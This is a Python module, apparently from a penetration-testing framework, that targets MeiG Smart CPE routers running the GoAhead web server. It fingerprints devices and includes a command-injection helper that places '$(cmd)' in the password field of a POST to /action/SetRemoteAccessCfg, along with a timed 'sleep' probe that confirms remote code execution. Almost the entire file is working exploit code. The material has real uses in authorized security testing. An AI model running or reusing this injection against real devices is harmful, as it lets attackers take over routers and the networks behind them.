#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import re
import time
from typing import Any, Dict, Optional

from core.framework.base_module import BaseModule

_DEFAULT_ENDPOINT = "/action/SetRemoteAccessCfg"

_FINGERPRINT_RES = (
    re.compile(r"goahead", re.I),
    re.compile(r"meig\s*smart", re.I),
    re.compile(r"forge[_-]?slt711", re.I),
    re.compile(r"ortel", re.I),
    re.compile(r"mdm9607", re.I),
)


class Meig(BaseModule):
    """Helpers shared by MeiG Smart CPE / GoAhead action modules."""

    DEFAULT_ENDPOINT = _DEFAULT_ENDPOINT

    @staticmethod
    def meig_normalize_path(path_value: Any) -> str:
        path = str(path_value or _DEFAULT_ENDPOINT).strip()
        if not path.startswith("/"):
            path = "/" + path
        return path

    @staticmethod
    def meig_retcode_ok(response) -> bool:
        if not response:
            return False
        try:
            data = response.json()
        except (json.JSONDecodeError, ValueError):
            return False
        if not isinstance(data, dict):
            return False
        return data.get("retcode") == 0

    def meig_inject(self, cmd: str, *, path: Any = None, timeout: Optional[int] = None):
        endpoint = self.meig_normalize_path(path or getattr(self, "target_path", None))
        wait = max(int(timeout or getattr(self, "timeout", None) or 10), 10)
        payload = {"password": f"$({cmd})"}
        return self.http_request(
            method="POST",
            path=endpoint,
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=wait,
            allow_redirects=False,
        )

    def meig_fingerprint(self, *, timeout: Optional[int] = None) -> Dict[str, Any]:
        wait = max(int(timeout or getattr(self, "timeout", None) or 10), 10)
        response = self.http_request(method="GET", path="/", timeout=wait, allow_redirects=True)
        if not response:
            return {"status": "error", "reason": "No response from target"}

        headers = {k.lower(): v for k, v in (response.headers or {}).items()}
        body = response.text or ""
        server = str(headers.get("server") or "")
        markers = [name for pattern in _FINGERPRINT_RES if pattern.search(body) or pattern.search(server)]
        if "goahead" in server.lower():
            markers.append("goahead-server")

        if markers:
            return {
                "status": "match",
                "reason": f"MeiG/GoAhead fingerprint ({', '.join(sorted(set(markers)))})",
                "server": server,
                "markers": sorted(set(markers)),
            }

        if "goahead" in server.lower():
            return {
                "status": "maybe",
                "reason": "GoAhead web server detected",
                "server": server,
                "markers": ["goahead-server"],
            }

        return {"status": "unknown", "reason": "No MeiG/GoAhead fingerprint on /", "server": server}

    def meig_probe_rce(
        self,
        *,
        sleep_seconds: int = 2,
        path: Any = None,
        timeout: Optional[int] = None,
    ) -> Dict[str, Any]:
        endpoint = self.meig_normalize_path(path or getattr(self, "target_path", None))
        sleep_s = max(int(sleep_seconds or 2), 1)
        wait = max(int(timeout or getattr(self, "timeout", None) or 10), sleep_s + 5)

        started = time.monotonic()
        try:
            response = self.meig_inject(f"sleep {sleep_s}", path=endpoint, timeout=wait)
        except Exception as exc:
            return {
                "status": "error",
                "reason": f"Probe failed: {exc}",
                "endpoint": endpoint,
            }

        elapsed = time.monotonic() - started
        if not response:
            return {
                "status": "error",
                "reason": "No response from SetRemoteAccessCfg probe",
                "endpoint": endpoint,
            }

        retcode_ok = self.meig_retcode_ok(response)
        timed = elapsed >= (sleep_s - 0.75)

        if retcode_ok and timed:
            return {
                "status": "vulnerable",
                "reason": (
                    f"SetRemoteAccessCfg executed injected sleep "
                    f"({elapsed:.1f}s, retcode=0)"
                ),
                "confidence": "high",
                "endpoint": endpoint,
                "elapsed": elapsed,
            }

        if retcode_ok:
            return {
                "status": "likely",
                "reason": "SetRemoteAccessCfg accepted injection payload (retcode=0)",
                "confidence": "medium",
                "endpoint": endpoint,
                "elapsed": elapsed,
            }

        return {
            "status": "not_vulnerable",
            "reason": f"Injection probe inconclusive (HTTP {response.status_code})",
            "confidence": "low",
            "endpoint": endpoint,
            "elapsed": elapsed,
        }
